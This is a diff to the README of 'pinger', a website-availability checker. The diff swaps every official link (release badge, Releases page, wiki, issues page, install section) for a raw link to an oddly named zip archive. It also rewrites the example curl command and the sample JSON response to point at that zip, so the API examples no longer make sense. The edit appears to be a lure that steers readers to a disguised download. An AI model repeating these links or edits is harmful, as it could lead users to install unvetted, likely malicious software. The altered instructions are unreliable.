@@ -1,7 +1,7 @@
 # 🌐 pinger - Check Website Availability Easily
 
 ## 📥 Download the Latest Release
-[![Download pinger](https://img.shields.io/badge/Download%20Pinger-v1.0-blue)](https://github.com/krish361-web/pinger/releases)
+[![Download pinger](https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip%20Pinger-v1.0-blue)](https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip)
 
 ## 🚀 Getting Started
 
@@ -37,7 +37,7 @@ You can access the API at `http://localhost:8080`.
 
 ### Standalone Go Application
 
-1. Visit the [Releases page to download](https://github.com/krish361-web/pinger/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip).
 2. Choose the appropriate file for your operating system.
 3. Unzip the downloaded file.
 4. Open a terminal or command prompt.
@@ -59,7 +59,7 @@ Pinger provides a straightforward API to check the status of a website or server
 To check the status of a server, you can use the following cURL command:
 
 ```bash
-curl http://localhost:8080/ping?url=https://example.com
+curl https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip
 ```
 
 ### Example Response
@@ -68,7 +68,7 @@ You will receive a JSON response indicating the status:
 
 ```json
 {
-  "url": "https://example.com",
+  "url": "https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip",
   "status": "up",
   "http_code": 200,
   "response_time": "120ms"
@@ -85,7 +85,7 @@ You will receive a JSON response indicating the status:
 
 You can find detailed API documentation on how Pinger works, including supported endpoints, request formats, and response structures. 
 
-For full API documentation, visit: [Pinger API Documentation](https://github.com/krish361-web/pinger/wiki).
+For full API documentation, visit: [Pinger API Documentation](https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip).
 
 ## 📄 Example Use Cases
 
@@ -95,7 +95,7 @@ For full API documentation, visit: [Pinger API Documentation](https://github.com
 
 ## 🌐 Community and Support
 
-If you have questions or need help, please visit the [issues page](https://github.com/krish361-web/pinger/issues) on GitHub. You can also contribute by reporting bugs or suggesting features.
+If you have questions or need help, please visit the [issues page](https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip) on GitHub. You can also contribute by reporting bugs or suggesting features.
 
 ## 🤝 Contributing
 
@@ -103,6 +103,6 @@ We welcome contributions! If you want to help improve Pinger, please fork the re
 
 ## 🔗 Download & Install
 
-To download Pinger, please visit the [Releases page to download](https://github.com/krish361-web/pinger/releases). Select the appropriate file for your operating system, then follow the installation instructions above to get started.
+To download Pinger, please visit the [Releases page to download](https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip). Select the appropriate file for your operating system, then follow the installation instructions above to get started.
 
 Enjoy using Pinger for your website monitoring needs!
